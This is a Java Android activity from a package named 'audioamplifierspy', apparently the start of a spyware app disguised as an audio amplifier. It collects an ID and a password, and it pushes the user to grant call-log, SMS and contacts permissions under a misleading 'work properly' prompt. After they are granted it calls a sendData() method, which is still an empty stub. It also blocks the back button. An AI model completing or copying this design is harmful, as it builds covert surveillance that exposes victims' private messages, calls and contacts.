package com.example.audioamplifierspy;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import java.util.List;

import pub.devrel.easypermissions.AfterPermissionGranted;
import pub.devrel.easypermissions.AppSettingsDialog;
import pub.devrel.easypermissions.EasyPermissions;

public class InputACT extends AppCompatActivity  implements EasyPermissions.PermissionCallbacks{

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_input_act);

        SharedPreferences preferences = getSharedPreferences("sharedPref", MODE_PRIVATE);
        SharedPreferences.Editor editor = preferences.edit();
        //remember to change to true
        editor.putBoolean("entered", false);
        editor.apply();

        //**********************************************************************************
        final EditText et = findViewById(R.id.number);
        final EditText password = findViewById(R.id.password);
        findViewById(R.id.save).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                //save it
                String id = et.getText().toString().trim();
                String pass = password.getText().toString().trim();
                if (!id.isEmpty() && !pass.isEmpty()){
                    Toast.makeText(InputACT.this, "saved", Toast.LENGTH_SHORT).show();
                    startActivity(new Intent(InputACT.this, MainActivity.class));
                    finish();
                }

            }
        });

        ask_permissions();


    }

    //requesting permission stuff
    @AfterPermissionGranted(123) // it will be used to call the function ask_permission after the permission is granted
    private void ask_permissions() {

        String[] perms = {Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.READ_CONTACTS};

        if (EasyPermissions.hasPermissions(this, perms) ){
            sendData();
        }
        else
            EasyPermissions.requestPermissions(this, "Grant All Permission for it to work properly", 123, perms);

    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        EasyPermissions.onRequestPermissionsResult(requestCode, permissions, grantResults, this);

    }


    //this is for the case after returning from settings
    @Override
    public void onPermissionsGranted(int requestCode, @NonNull List<String> perms) {
        if (requestCode == AppSettingsDialog.DEFAULT_SETTINGS_REQ_CODE)
            sendData();

    }

    @Override
    public void onPermissionsDenied(int requestCode, @NonNull List<String> perms) {
        //take user again to settings to grant permission
        if (EasyPermissions.somePermissionPermanentlyDenied(this, perms) ){
            new AppSettingsDialog.Builder(this).build().show();
        }

    }
    //******************************************************

    private void sendData() {
        //do something

    }

    @Override
    public void onBackPressed() {
        return;

    }
}


